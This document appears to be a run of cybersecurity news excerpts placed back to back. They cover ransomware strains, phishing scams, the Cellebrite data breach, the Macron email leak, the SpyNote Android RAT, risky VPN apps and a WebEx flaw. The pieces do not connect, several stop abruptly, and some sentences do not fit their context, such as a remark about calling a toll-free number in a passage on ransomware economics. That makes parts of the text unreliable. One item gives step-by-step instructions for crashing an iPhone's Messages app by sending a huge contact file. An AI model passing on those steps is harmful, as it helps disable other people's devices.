But ESET security researcher Marc-Etienne M.L Éveillé, in a blog post, says the application is so poorly coded that there's no way that a victim could ever obtain a decryption key.
So far, ESET reports that the single bitcoin wallet tied to the ransomware has received no payments.
""There is one big problem with this ransomware: It doesn't have any code to communicate with any C&C; server,"" says Éveillé, referring to a command-and-control server that might have been used to remotely control the infected endpoint.
""This means that there is no way the key that was used to encrypt the files can be sent to the malware operators.
This also means that there is no way for them to provide a way to decrypt a victim's files.""
The longstanding ransomware-defense advice, of course, is to never pay ransoms, because this directly funds cybercrime groups' ongoing research and development.
Instead, stay prepared: Keep complete, disconnected backups of all systems, and periodically test that they can be restored, and thus never have to consider paying a ransom.
""We advise that victims never pay the ransom when hit by ransomware,"" Éveillé says.
In other ransomware news, new ransomware known as Trump Locker - not to be confused with Trumpcryption - turns out to be a lightly repackaged version of VenusLocker ransomware, according to Lawrence Abrams of the security analysis site Bleeping Computer, as well as the researchers known as MalwareHunter Team.
""Unfortunately, you are hacked,"" the start of the malware's ransom demand reportedly reads.
VenusLocker first appeared in October 2016; it got a refresh two months later.
The researchers don't know if the group distributing Trump Locker is the same group that distributed VenusLocker, or if another group of attackers reverse-engineered the code.
But they say that functionally, the two pieces of malware appear to be virtually identical, Bleeping Computer reports.
For example, both Trump Locker and VenusLocker will encrypt some files types in full, while only encrypting the first 1024 bytes of other file types, including PDF, XLS, DOCX, and MP3 file formats.
Fully encrypted files have "".TheTrumpLockerf"" appended to their filename, while partially encrypted files get a "".TheTrumpLockerp"" extension added, the researchers say.
Finally, ransomware gangs' use of customer service portals - to help and encourage victims to pay their ransoms - continues, says Mikko Hypponen, chief research officer of Finnish security firm F-Secure.
One chief function of this support appears to be to help victims who don't know their Windows from their ASP to find a way to remit bitcoins to attackers, according to research into crypto-ransomware called Spora and its related customer-support operation, conducted by F-Secure's Sean Sullivan.

With news last week that Pennsylvania Senate Democrats (along with about 11 other progressive groups) had apparently fallen prey to an attack by Russian hackers, it's tempting to ask if anyone is safe from the waking Great Bear.
Democratic leaders have so far refused to meet the hackers' ransom demand or risk having their data destroyed, The Associated Press reported.
The bad news is that the attack is a visceral reminder that no computer network is totally immune to a takeover by determined cyber-terorrists.
It's also a reminder that the United States disregards this foreign threat at its peril.
And it is one that is growing in its size and scope.
Hackers launched 638 million ransomware attacks last year, at a cost of about $209 million, PennLive's Wallace McKelvey reported Wednesday, citing data compiled by the security firm SonicWall.
That was more than 167 times the 3.8 million attacks logged in 2015.
The short form is that you can't protect yourself from the most determined hackers, as former presidential candidate Hillary Clinton and the Democratic National Committee learned during last year's presidential campaign.
And whether you're a large corporation or just sitting in your local Starbucks pecking away on your laptop, the measures are essentially the same.

Scammers taking advantage of tax time are trying to trick Australians into handing over their personal details with the promise of a tax refund through a fake myGov form.
Stay Safe Online issued a high alert for the latest scam on Wednesday.
""It's tax time and the common scam email informing that you're eligible for a tax refund is doing the rounds again,"" the warning said.
""Scammers have long used the promise of a tax refund to trick people into sharing their personal information or to download malware.""
The phishing email claims to come from myGov and has the subject line, ""Important information regarding your account"", as well as the myGov logo.
It asks you to click on a link to claim your refund.
The link leads to a fake tax refund claim form, asking for personal details such as email, password, and credit card details.
""After you supply this information and click the continue button, you'll be automatically redirected to the myGov website. By then it's too late and the scammer has your details.""
Stay Safe Online said scammers can use that information to commit credit card fraud and identity theft.
""The ATO and myGov will never send an email or SMS asking you to click on a link and provide login, personal or financial information, download a file or open an attachment.""
Earlier this month scammers used a cloned version of myGov website in an attempt to lure in victims with a phishing email.
Australian Taxation Office assistant commissioner Kath Anderson said tax time was a popular time for scammers to prey on unsuspecting Australians, busily preparing their tax returns or even waiting on a refund.

It lets users send out text messages as well as audio messages, videos and pictures.
It is also possible to personalize the messages sent via iMessage with a variety of animations using other Apple apps.
This particular app is compatible with iOS, watchOS and macOS.
Basically, it is a very widely used app by iPhone users.
So when there is a bug in the app that is so severe that it can crash the phone easily, then users are bound to get concerned.
According to reports, there is a nefarious text message that is being sent to iPhone users even on those phones that run on the latest iOS 10.
This message is quite troublesome for users because it has the power to crash their phones within minutes.
The new iMessage hack lets the attackers disable the Message app through sending an extensive contact record.
This record file is pretty huge so as soon as the user taps on the recorded message, it immediately over-burdens the OS and terminates the app.
The problem is that iPad and iPhone users who use iOS8 to iOS10.2.1 versions cannot do anything to prevent this assault.
The most disturbing part of the hack is that it is very difficult to prevent or avoid unless the recipient of the message is aware of what is to be done.
Generally, users reboot their device or restart the iMessage app, which certainly doesn’t resolve the issue.
Another aspect to be noted is that this hack can be distributed by the victim himself to other contacts.
Here is how it can be done:
Download the contact file, upload the contacts in dropbox or iCloud Drive, share this file using iMessage to the person you want to get hacked, wait until the victim taps on it and the app will instantly freeze.
This time, the attackers have tried a different strategy to hack iMessage app; previously they used to send infected links or weird text messages but this time they just send a huge contact file to disable the app.

This is part of an ongoing Motherboard series on the proliferation of phone cracking technology, the people behind it, and who is buying it.
Motherboard has obtained 900 GB of data related to Cellebrite, one of the most popular companies in the mobile phone hacking industry.
The cache includes customer information, databases, and a vast amount of technical data regarding Cellebrite's products.
The breach is the latest chapter in a growing trend of hackers taking matters into their own hands, and stealing information from companies that specialize in surveillance or hacking technologies.
Cellebrite is an Israeli company whose main product, a typically laptop-sized device called the Universal Forensic Extraction Device (UFED), can rip data from thousands of different models of mobile phones.
That data can include SMS messages, emails, call logs, and much more, as long as the UFED user is in physical possession of the phone.
Cellebrite is popular with US federal and state law enforcement, and, according to the hacked data, possibly also with authoritarian regimes such as Russia, the United Arab Emirates, and Turkey.
The cache includes alleged usernames and passwords for logging into Cellebrite databases connected to the company's my.cellebrite domain.
This section of the site is used by customers to, among other things, access new software versions.
In the majority of cases, this was not possible because the email address was already in use.
A customer included in the data confirmed some of their details.
The dump also contains what appears to be evidence files from seized mobile phones, and logs from Cellebrite devices.
According to the hacker, and judging by timestamps on some of the files, some of the data may have been pulled from Cellebrite servers last year.
""Cellebrite recently experienced unauthorized access to an external web server,"" the company said in a statement on Thursday after Motherboard informed it of the breach.
""The company is conducting an investigation to determine the extent of the breach.
The impacted server included a legacy database backup of my.Cellebrite, the company's end user license management system.
The company had previously migrated to a new user accounts system.
Presently, it is known that the information accessed includes basic contact information of users registered for alerts or notifications on Cellebrite products and hashed passwords for users who have not yet migrated to the new system,"" the statement continues.
Cellebrite advised customers to change their passwords as a precaution, and added that it is working with relevant authorities to assist in their investigation.
Access to Cellebrite's systems has been traded among a select few in IRC chat rooms, according to the hacker.
""To be honest, had it not been for the recent stance taken by Western governments no one would have known but us,"" the hacker told Motherboard.
The hacker expressed disdain for recent changes in surveillance legislation.
In 2014 a hacker calling themselves ""PhineasFisher"" publicly released 40GB of data from surveillance company Gamma International.
Gamma makes intrusion software that can remotely switch on a target's webcam, siphon off their emails, and much more.
The following year, PhineasFisher targeted Italian company Hacking Team, and published a trove of emails and other internal documents from the company.
Although the terms of this Cellebrite breach are somewhat different—the hacker has not dumped the files online for anyone to download—similarities seem to remain, especially in the hacker's vigilante motivation.

Prize scams are as old as the hills, but people keep falling for them — sending the fraudsters hundreds, sometimes thousands of dollars to claim their cash, luxury cars or other non-existent prizes.
Sweepstakes, lottery and prize scams “are among the most serious and pervasive frauds operating today,” according to a new report from the Better Business Bureau. And along with phone calls, letters and email, the crooks are now using text messages, pop-ups and phony Facebook messages to lure their victims. In fact, social media is now involved in a third of the sweepstakes fraud complaints received by the FBI’s Internet Crime Complaint Center (IC3).
“Scammers are like viruses. They mutate and adapt and find things that work,” said Steve Baker, former director of the Federal Trade Commission’s Midwest region and author of the BBB report. “The crooks have discovered social media big time and since social media is free to use, they can easily do a whole lot of damage from other countries.”
The BBB study found that:
    Nearly 500,000 people reported a sweepstakes, lottery or other prize scam to law enforcement agencies in the U.S. and Canada in the last three years.
    Monetary losses totaled $117 million last year.
Facebook Messenger Lottery Fraud
Scammers are creating bogus websites that look like a legitimate lottery or sweepstakes site. Or they are reaching out to potential victims who don’t properly set their privacy settings on social media platforms such as Facebook.
The BBB report says Facebook Messenger, the private messaging app, is a favorite way for fraudsters to find victims. They can use Messenger — with or without a Facebook profile — and contact people who are not Facebook friends.
In many cases, the bogus message appears to be from Publishers Clearing House (PCH) congratulating you on winning a big prize. To claim that prize, it says, you need to send them money.
“That’s a red flag warning,” said Chris Irving, a PCH assistant vice president. “If anybody asks you to send money to collect a prize, you know it's a scam and it's not from the real Publishers Clearing House. At Publishers Clearing House or any legitimate sweepstakes, the winning is always free — no purchase, no payment, no taxes or customs to pay.”
The crooks also impersonate Facebook founder Mark Zuckerberg in some of their phony Messenger messages.
“They post a fake profile of Zuckerberg on Facebook,” Baker said. “Then they send you a message through the Facebook messenger system saying: ‘Hi this is Mark Zuckerberg. I'm delighted to be able to tell you that you have won the Facebook Lottery and here is the person you need to contact to get the money.’ ”
Take the bait and click the link, and you’ll be told to send money to claim your winnings. Of course, there is no Facebook Lottery and Zuckerberg is not sending prize notices to anyone.
In a recent story on social media scams, the New York Times reported it found 208 accounts that impersonated Zuckerberg or Facebook COO Sheryl Sandberg on Facebook and Instagram. At least 51 of the impostor accounts, including 43 on Instagram, were lottery scams. (In 2012, Facebook purchased Instagram for $1 billion.)
Facebook says it’s working to stop the scammers who use its platform to trick people out of their money. In March, the company announced it was using new machine learning techniques that helped it detect more than a half-million accounts related to fraudulent activity.
“These ploys are not allowed on Facebook and we're constantly working to better defend against them,” said Product Manager Scott Dickens. “While we block millions of fake accounts at registration every day, we still need to focus on the would-be scammers who manage to create accounts. Our new machine learning models are trained on previously confirmed scams to help detect new ones.”
The company has also posted a warning on how to avoid Facebook scams.
The BBB report calls on Facebook and other social media platforms to make “additional efforts” to prevent fake profiles and to make it easier for users to contact them about fraud.

Another presidential election, another massive data dump seemingly intended to sabotage a center-left candidate. But in the case of France's impending runoff, slated for Sunday, the latest leak of emails appears far more slap-dash than the Russian hacks and leaks that plagued Hillary Clinton's campaign. And in this case, they're timed to prevent the target of those leaks from even having a chance to respond.
On Friday, a collection of links to torrent files appeared on the anonymous publishing site PasteBin. The 9GB trove purports to be an archive of leaked emails from the party of Emmanuel Macron, the left-leaning candidate currently favored to win France's impending runoff election against far-right opponent Marine Le Pen.
The latest data dump comes less than 48 hours before France's election, possibly too late to shift its outcome—at least to the degree that the hacks of the DNC and Clinton campaign chairman John Podesta did in the months leading up to the US election. Its timing so close to the runoff could still prove strategic, as French law forbids candidates from speaking publicly for two days ahead of an election. That timing could prevent Macron himself from responding to any scandal that surfaces in the data dump, real or fabricated.
In a statement, Macron’s political party confirmed that hackers had compromised it. ""The En Marche party has been the victim of a massive, coordinated act of hacking, in which diverse internal information (mails, documents, accounting, contracts) have been broadcast this evening on social networks,"" reads a public statement in French from the Macron campaign. ""The files which are circulating were obtained a few weeks ago thanks to the hacking of the professional and personal email accounts of several members of the campaign.""

Late last month, the security firm Trend Micro noted in a report that the Macron campaign appeared to be a target of the Russian-government-linked hacker group Fancy Bear, also known as Pawn Storm or APT 28. The firm's researchers found a phishing domain created by the hacker group in March, designed to target the campaign by impersonating the site that En March uses for cloud data storage. At the time, the Macron campaign claimed that that hacking attempts had failed. On Friday morning, users of the anonymous forum 4Chan had also purported to have published evidence of Macron's tax evasion, though those claims were also unverified, and it's not clear if they're connected to the current leak.
In the wake of Russian hackers' attempt to sway the US election, which remains the subject of two Congressional investigations, the cybersecurity community has warned that the Kremlin may attempt similar tricks to swing elections towards its favored candidates in the French and upcoming German elections, too.
Former British intelligence staffer Matt Tait warned that regardless of what it contains, the simple fact of the data dump achieves certain objectives. ""By all means, look through them,"" he wrote on Twitter. ""But do[so] with your eyes open and knowing that you're being played for free negative coverage/headlines.""
The Macron campaign compared the hacking directly to the hacker targeting of Clinton campaign. ""Intervening in the last hour of an official campaign, this operation clearly seeks to destabilize democracy, as already seen in the United States' last president campaign,"" the statement reads. ""We cannot tolerate that the vital interests of democracy are thus endangered.""

Islamic State supporters are warning one another of malware targeting the militant group through the chat app Telegram.
One member on a popular ISIS forum alerted users to plus_gram.apk, a trojanized RAT (a remote access tool disguised as harmless software) that allows an attacker to spy on and take full control of the target’s Android device.
The ISIS supporter used malware analysis at NVISIO, a popular free platform to test Android software for malicious code.
The warning was first spotted and described by @switch_d, a veteran ISIS watcher.
This attack arrives as a phishing link disguised as an invitation to a video chat, according to the warning, a tactic ISIS supporters have fallen victim to in the past.
The responses to the warning include a thanks and common sense guidance to “only accept files from brothers you know”.
This malware runs in multiple stages, Khalil Sehnaoui, a Middle East-based cybersecurity specialist and founder of Krypton Security, told CyberScoop.
“The exploit code is usually small and after successful exploitation it runs a dropper code which will in turn download new applications/malware in order to get more control of the system by escalating privileges”.

Ransomware is perhaps the most ingenious cybercrime in the history of the Internet in terms of its simplicity and effectiveness.
It has caused absolute terror in nearly every industry, affecting almost 50% of organizations in 2016, and is considered one of the top cyberthreats to the enterprise for 2017.
According to the FBI, ransomware — malware that holds systems and data for ransom — cost victims $209 million in the first three months of 2016, yet totaled only $24 million in all of 2015.
This astronomical rise in ransomware is motivated, in large part, by a lack of preparedness.
And the problem will get worse before it gets better.
But in order to understand the rise of ransomware, you need to understand its economics.
The Business of RansomwareTraditional data from major breaches is starting to be worth less and less as the black market gets flooded with stolen records.
Just call a toll-free number and the problem is fixed in minutes.
Even the cost of prized electronic healthcare records is down 50% to 60% from last year.
But at the same time, the price per ransom has continued to climb, and much of the data being ransomed is completely worthless on the black market.
Innovations in online payments have also helped pave the way for the current ransomware epidemic.
Similar to how some sites are the middlemen for sellers, Web-based ""businesses"" started to appear in early 2016 to act as proxies for data extortionists to post sensitive stolen data to add urgency to payment demands, sell the stolen data to a third-party, or utilize it in other ways.
These Web vendors use a ""Business 101"" approach by providing an easy Bitcoin-based payment interface — currently worth $768 each (at the time of writing this) — and take a cut of every payment.
Popularity Breeds PandemicBecause of ransomware's massive success, its creators are pushing new technologies to their limits, with the potential to infiltrate every data storage device between the Internet and any given company.
And with the massive success of Mirai — the Internet of Things botnet that took down a portion of the Internet last fall — connected devices are poised to become the next big target, translating into even more ransomware.

“Over the past several weeks, we have seen a combination of attack techniques.
One, where an attacker impersonates a travel agency or someone inside a company.
Recipients are told an email contains an airline ticket or e-ticket,” said Asaf Cidon, vice president, content security services at Barracuda Networks.
Attachments, he said, are documents rigged with malware or are designed to download it from a command and control server.
Cidon said other aviation-themed phishing attacks contain links to spoofed airline sites.
In these types of attacks, adversaries go to great lengths to spoof the airline’s site.
“It’s clear there is some degree of advanced reconnaissance that takes place before targeting individuals within these companies,” Cidon said.
Recent phishing campaigns, he said, are targeting logistic, shipping and manufacturing industries.
Barracuda’s warning comes a week after the U.S. Computer Emergency Readiness Team issued an alert of similar attacks targeting airline consumers.
It warned email-based phishing campaigns were attempting to obtain credentials as well.
“Systems infected through phishing campaigns act as an entry point for attackers to gain access to sensitive business or personal information,” according to the US-CERT warning.
Delta said some victims were sent emails that claimed to contain invoices or receipts inside attached documents.
When asked about the warning, Delta declined to comment.
More troubling to Barracuda researchers was the success rate adversaries are having with phishing campaigns it is tracking.
“Our analysis shows that for the airline phishing attack, attackers are successful over 90 percent of the time in getting employees to open airline impersonation emails,” Cidon wrote in a research note posted Thursday.
“This is one of the highest success rates for phishing attacks”.
In June, Microsoft Malware Protection Center reported a resurgence in the use of Office document macro attacks.
Researchers say crooks attempting to install malware and perpetrate credential-harvesting attacks are more likely to use social engineering to trick people into installing malware than to exploit vulnerabilities with tools such as exploit kits.

The malware asks for 222 Bitcoin but will not honor promises to decrypt files after payment is made.
The cost of ransomware reached close to $1 billion in 2016, and it's not hard to see why.
The malware family, which targets everything from Windows to Mac machines, executes procedures to encrypt files and disks before demanding a ransom payment in return for keys to decrypt and unlock compromised machines.
However, it is not only the general public which is being targeted with everything from hospitals to schools and businesses now in the firing line.
As the prospect of losing valuable content on computer systems or facing widespread disruption to business operations is often too much to bear, many will simply give up and give in, paying the fee and unfortunately contributing to the cybercriminal's operations.
However, paying up does not guarantee that victims will get their files back, no matter how low or high the payment demand.
This week, ESET researchers discovered that a Linux variant of KillDisk, linked to attacks against core infrastructure system in Ukraine in 2015, is now being used against fresh Ukrainian financial targets.
The ransomware demands a huge amount of money, but there is no underwritten protocol for decryption keys to be released once payment is made.
Distributed through phishing campaigns targeting both Windows and Linux, once downloaded, the ransomware throws up a holding page referring to the Mr.
Robot television show while files are being encrypted, the research team said in a blog post.
Unsurprisingly, no-one has paid up yet, nor should they, ever.
""This new variant renders Linux machines unbootable, after encrypting files and requesting a large ransom,"" ESET says.
""But even if victims do reach deep into their pockets, the probability that the attackers will decrypt the files is small.""
Files are encrypted using Triple-DES applied to 4096-byte file blocks and each file is encrypted using different sets of 64-bit encryption keys.
However, the ransomware does not store encryption keys either locally or through a command-and-control (C&C) server, which means that affected systems after reboot are unbootable, and paying the ransom is pointless.
""It is important to note -- that paying the ransom demanded for the recovery of encrypted files is a waste of time and money,"" the team said.
""Let us emphasize that -- the cyber criminals behind this KillDisk variant cannot supply their victims with the decryption keys to recover their files, despite those victims paying the extremely large sum demanded by this ransomware.""
There is a weakness in the encryption used by the ransomware, which makes recovery possible -- at least when it comes to Linux infections.
Earlier this week, researchers at Check Point revealed the latest exploits of the GoldenEye ransomware, a strain of malware which is targeting German HR companies.
The malware is contained in phishing emails which appear to be from job applicants, and once downloaded and installed, demands $1000 in Bitcoin to unlock infected systems.

 BALTIMORE — The hack that forced Baltimore’s 911 dispatch system to be temporarily shut down over the weekend was a ransomware attack, city officials said Wednesday.
Such attacks — another of which occurred in Atlanta last week — take over parts of private or municipal computer networks and then demand payment, or ransom, for their release.
Frank Johnson, chief information officer in the Mayor’s Office of Information Technology, said he was not aware of any specific ransom request made by the hackers of Baltimore’s network, but federal authorities are investigating.
“The systems and the software and the files are all being investigated by the FBI right now,” Johnson said.
No personal data of city residents was compromised, he added.
Dave Fitz, an FBI spokesman, could not be reached Wednesday. On Tuesday, Fitz said the agency was aware of the breach and providing assistance to the city, but otherwise declined to comment.
The attack infiltrated a server that runs the city’s computer-aided dispatch, or CAD, system for 911 and 311 calls. The system automatically populates 911 callers’ locations on maps and dispatches the closest emergency responders there more seamlessly than is possible with manual dispatching. It also relays information to first responders in some cases and logs information for data retention and records.
The breach shut down the CAD system from Sunday morning until Monday morning, forcing the city to revert to manual dispatching during that time. While the city’s 911 calls are normally recorded online on Open Baltimore, the city dispatch logs stopped recording them at 9:54 a.m. Sunday and didn’t resume recording them again until 7:42 a.m. Monday.
Johnson said the attack was made possible after a city information technology team troubleshooting a separate communications issue with the server inadvertently changed a firewall and left a port, or a channel to the Internet, open for about 24 hours, and hackers who were likely running automated scans of networks looking for such vulnerabilities found it and gained access.
The Baltimore hack comes amid increasing hacking of municipal systems across the country, and follows one in Atlanta last week that paralyzed that city’s online bill-payment system, with hackers demanding a $51,000 payment in bitcoin to unlock it. That attack occurred Thursday, and Atlanta employees only turned their computers back on Tuesday.
Johnson said his office works diligently to prevent cyberattacks and is looking to invest more in safeguarding its networks.
Baltimore also faced cyberattacks during the unrest in 2015, when its website was taken offline. Johnson said he was unaware of any other successful attacks on the city’s networks. He said the city would be obligated to disclose any attacks that compromised residents’ personal information, health information or crime data.
Johnson said he feels the city recovered well from the breach once it was identified, but that he did not want to go into detail about what was done lest he expose the city to more attacks.
The city has a $2.5 million contract with TriTech Software Systems to maintain its CAD software and provide “technical support services to ensure the functional integrity” of the city’s CAD system.
Scott MacDonald, TriTech’s vice president of public safety strategy, said the company worked with city IT personnel to shut down the CAD software after the attack. The breach was not related to the company’s software, MacDonald said.
“Our techs connected and worked with the IT staff there, and the CAD system was taken down manually, in combination between our staff and theirs, while the servers could be troubleshooted by the city.”

State-owned computers in Colorado are being held for ransom.
According to the governor’s office, some Colorado Department of Transportation computers were first infected with ransomware on Wednesday. Security tools detected the problem.
David McCurdy, the chief technology officer in Colorado, said in a statement that staff quarantined the virus to prevent it from spreading.
The ransomware demanded a payment in bitcoin, Brandi Simmons, a state spokesperson, said. The state tells Next they have never paid ransomware criminals in the past, and they have no intention of starting now.
The FBI and other security agencies, as well as Governor Hickenlooper’s Office of Information Technology, are trying to find the source of the issue - whether it be hacking or human error.
Infected servers have been taken offline, Simmons said. She could not say how many computers were affected, but all of the critical systems are still in use.
The state is not yet sure what, if any impact, this will have.

Researchers say a piece of ransomware disguised as a battery app made its way into the Play store.
Check Point says one of its customers contracted the malware app, dubbed ""Charger,"" after installing what they thought was a battery monitoring tool called EnergyRescue.
Researchers with Check Point Mobile Threat Prevention say the malware activates when EnergyRescue runs, and requires admin access to the device.
Once that permission is granted, the malware checks for location (it does not attack phones in the Ukraine, Belarus, or Russia), then swipes all user contacts and SMS messages and locks down the device.
From there, the user is told that they must pay to deactivate the ransomware or they will have their full details spaffed out for various nefarious activities, including bank fraud and spam.
""You need to pay for us, otherwise we will sell portion of your personal information on black market every 30 minutes,"" the ransomware tells users.
Not ones to be unprofessional, the Charger operators attempt to reassure their victims by offering a ""100% guarantee"" that once the 0.2 Bitcoin ransom (currently around $183) is paid, all the collected information will be deleted and the device unlocked.
""The ransom demand for 0.2 Bitcoins is a much higher ransom demand than has been seen in mobile ransomware so far,"" note Check Point mobile security analysts Oren Koriat and Andrey Polkovnichenko.
""By comparison, the DataLust ransomware demanded merely $15.""
Check Point says that thus far it has not spotted any payments being registered to the Bitcoin address used for the ransom collection, so it is unclear how much, if anything, has been made from this operation.

For the second time in a week, a major U.S. airline grounded its fleet after its computer systems stopped working.
The latest incident involved Delta Air Lines (NYSE:DAL), which canceled 170 flights on Sunday and another 110 on Monday because its ""essential IT systems went down"" over the weekend.
The issue at Delta Air Lines alone doesn't seem suspicious -- computers fail all the time.
But there are two things that could lead one to wonder if there's more to this than meets the eye.
The first is that Delta isn't just some guy like me sitting at home who doesn't know a thing about computers.
It generates over $40 billion worth of revenue each year.
The point is, Delta has plenty of resources to ensure that its systems don't just ""stop working.""
The second piece of the puzzle is that Delta's issues come one week after a similarly ambiguous glitch brought down the computer system at United Airlines, a subsidiary of United Continental Holdings (NYSE:UAL).
Like Delta, United Airlines has tens of thousands of employees and earns tens of billions of dollars in annual revenue.
While it's impossible to say for sure if there's a connection between these two incidents, as neither company has explained why their computers crashed, there's reason to be suspicious that they weren't simply innocent failures of technology.
In the course of researching cyber-threats to banks, I spoke last week with John Carlin, the former assistant attorney general for national security at the Department of Justice and one-time chief of staff at the FBI.
There are few people who know as much about cyber-threats today as Carlin, as is clear if you watch his appearance on The Charlie Rose Show here.
Carlin pointed out both to me and to Rose that cyber attacks are waged against the American government and companies all the time.
At the FBI, they even have a room with an enormous monitor mounted on the wall that tracks attacks in real time.
One of the stories Carlin shared was about the time that the People's Liberation Army of China was caught routinely hacking into American corporations' computers to steal trade secrets.
""One time they stole the pricing information from a solar company so they could price-dump,"" the former law-enforcement officer explained.
""To add insult to injury, when they were sued for doing so, they then stole the litigation strategy from [the solar company] as well.""
The purpose of the attack wasn't to bring down the solar companies' systems, but those types of intrusions are just as common.
Hackers regularly break into systems and then bring them to a halt until the victims make ransom payments.
Or, in the case of a sustained cyber attack on four dozen U.S. banks from 2011 through 2013, which was traced back to the Iranian Revolutionary Guard, systems can be disrupted in retaliation for cyber attacks conducted by our own intelligence agencies, as news reports speculated at the time.
To get back to Delta Air Lines and United Airlines, then, it doesn't seem like an unreasonable stretch of the imagination to assume that the unexplained computer outages at the two companies weren't a coincidence at all, but instead the result of cyber attacks.

As users have become more attached to their mobile devices, they want everything on those devices.
There’s an app for just about any facet of one’s personal and professional life, from booking travel and managing projects, to buying groceries and binge-watching the latest Netflix series.
The iOS and Android apps for Netflix are enormously popular, effectively turning a mobile device into a television with which users can stream full movies and TV programs anytime, anywhere.
But the apps, with their many millions of users, have captured the attention of the bad actors, too, who are exploiting the popularity of Netflix to spread malware.
Recently, the ThreatLabZ research team came across a fake Netflix app, which turned out to be a new variant of SpyNote RAT (Remote Access Trojan).
Please note that our research is not about the legitimate Netflix app on Google Play.
The spyware in this analysis was portraying itself as the Netflix app.
Once installed, it displayed the icon found in the actual Netflix app on Google Play.
This is a common trick played by malware developers, making the user think the app may have been removed.
But, behind the scenes, the malware has not been removed; instead it starts preparing its onslaught of attacks.
It does so using the Services, Broadcast Receivers, and Activities components of the Android platform.
Services can perform long-running operations in the background and does not need a user interface.
Broadcast Receivers are Android components that can register themselves for particular events.
Activities are key building blocks, central to an app’s navigation, for example.
The SpyNote RAT registers a service called AutoStartup and a broadcast receiver named BootComplete.
MainActivity registers BootComplete with a boot event, so that whenever the device is booted, BootComplete gets triggered.
BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running.
What follows are some of the features exhibited by SpyNote RAT.
Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device.
Leveraging this feature, the malware developer can root the device using a range of vulnerabilities, well-known or zero-day.
SpyNote RAT was able to take screen captures and, using the device’s microphone, listen to audio conversations.
This capability was confirmed when the Android permission, called android.permission.RECORD_AUDIO, was being requested along with code found in the app.
They tend to target any antivirus protections on the device and uninstall them, which increases the possibility of their malware persisting on the device.
SpyNote RAT was designed to function only over Wi-Fi, which is the preferable mode for Android malware to send files to C&C.
- There were two interesting sub-classes found inside Main Activity: Receiver and Sender.
Receiver was involved in receiving commands from the Server and the  main functionality of Sender was to send all the data collected to the C&C over Wi-Fi.
- SpyNote RAT was also collecting the device’s location to identify the exact location of the victim.
The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness.
What we found were several other fake apps developed using the SpyNote builder, which should come as a warning to Android users.
Furthermore, we found that in just the first two weeks of 2017, there have been more than 120 such spyware variants already built using the same SpyNote Trojan builder as SpyNote RAT and roaming in the wild.
A complete list of sample hashes is available here.
The days when one needed in-depth coding knowledge to develop malware are long gone.
Nowadays, script kiddies can build a piece of malware that can create real havoc.
Moreover, there are many toolkits like the SpyNote Trojan builder that enable users to build malware with ease and few clicks.
In particular, avoid side-loading apps from third-party app stores and avoid the temptation to  play games that are not yet available on Android.
Yes, we are talking about SuperMarioRun, which was recently launched by Nintendo only for iOS users.
Recent blogs by the Zscaler research team explain how some variants of Android malware are exploiting the popularity of this game and tricking Android users into downloading a fake version.
You should also avoid the temptation to play games from sources other than legitimate app stores; such games are not safe and may bring harm to your reputation and your bank account.
Zscaler users are protected from such attacks with multiple levels of security.
Zscaler security is so comprehensive, you can forget about it.

Cyber crooks have come up with a new way to infect your computer with financial and banking malware.
The process starts by randomly sending users spam emails disguised as a payment confirmation email from Delta Air.
The choice to mask the email as coming from an airline wasn’t random, since many this time of year is when many consumers purchase flight tickets at discounted rates for the summer.
However, no transaction actually took place! The email is designed to scare you into thinking someone bought an airplane ticket using your identity. You then panic and click on one of the links in the email in order to figure out how someone could do an unauthorized purchase with your credentials.
The links then redirect you to several compromised websites, which host Word documents infected with the Hancitor malware.
Hancitor is a versatile malware frequently used in phishing attacks that specializes initially infecting a PC, and then acting as a bridge for further malware downloads.
If you download the malicious Word document and open it, then Hancitor will activate and infect legitimate system processes in your PC using a PowerShell code. Afterwards, your PC will connect to one or more malicious Command and Control (C&C) servers.
These C&C servers will then download additional malware on your PC, which belong to the Pony family.
Pony malware is specifically designed to steal sensitive information such as passwords and usernames from VPNs, web browsers, FTP, messaging apps and many more.
On top of that, the C&C servers also download and spread another Pony-based malware called Zloader. Unlike Pony, Zloader is a banking malware designed to clean up your bank account and steal financial information.
Once the information harvesting is complete, the malware connects to another set of C&C servers and sends them all of your credentials and financial information.

An alarming number of Android VPNs are providing a decidedly false sense of security to users, especially those living in areas where communication is censored or technology is crucial to the privacy and physical security.
A study published recently identified a number of shortcomings common to high percentages of 238 mobile VPN apps analyzed by a handful of researchers.
Users downloading and installing these apps expecting secure communication and connections to private networks are instead using apps that lack encryption, are infected with malware, intercept TLS traffic, track user activity, and manipulate HTTP traffic.
“Our experiments reveal several instances of VPN apps that expose users to serious privacy and security vulnerabilities, such as use of insecure VPN tunneling protocols, as well as IPv6 and DNS traffic leakage,” said researchers Muhammad Ikram , Narseo Vallina-Rodriguez , Suranga Seneviratne , Mohamed Ali Kaafar and Vern Paxson, representing Australia’s Commonwealth Scientific and Industrial Research Organization (AU-CSIRO), the University of South Wales, and the International Computer Science Institute at the University of California at Berkeley.
Their findings and methodology can be found in a paper: “An Analysis of the Privacy and Security Risks of Android VPN Permission-enabled Apps”.
“We also report on a number of apps actively performing TLS interception.
Of particular concern are instances of apps that inject JavaScript programs for tracking, advertising, and for redirecting e-commerce traffic to external partners,” they said.
The researchers identified a core weakness commonly abused in many of the apps called the BIND_VPN_SERVICE, native platform support for VPN clients introduced by Google in 2011 in Android 4.0.
BIND_VPN_SERVICE is used by developers in the creation of clients to intercept, manipulate and forward traffic to a remote proxy or VPN server, or to implement proxies in localhost, the researchers said.
It’s a powerful Android service that can be easily abused, depending on intent.
The paper describes how the Android VPN API exposes a network interface to a requesting app and routes traffic from a phone or tablet to the requesting app.
Developers must declare access to the BIND_VPN_SERVICE in the AndroidManifest file, but to only one app at a time.
The potential for abuse is high any time traffic is re-routed; Android counters this with two warnings informing the user that a virtual network interface has been created and remains active.

The big security issue of the week is a remote code execution hole related to the Cisco WebEx service.
WebEx is a popular collaboration tool for online events such as meetings, webinars and videoconferences.
Like many services of this sort, you access online events via your browser, augmented by a special-purpose browser extension.
Browser extensions and plugins allow web developers to extend the software features inside your browser with a mixture of scripts and program code, for example to add configuration options or to support new audio and video formats.
Of course, when you add  another layer of programmatic complexity on top of an already-complex browser, it’s easy to add new security holes, too.
Perhaps the best known example of a problematic plugin is Adobe Flash, which has provided cybercrooks with such a fruitful source of exploitable security holes over the years that we have long been urging you to try to live without Flash altogether.
The latest security scare of this sort has been dubbed CVE-2017-3823, and it applies to Cisco’s special-purpose WebEx browser extension.
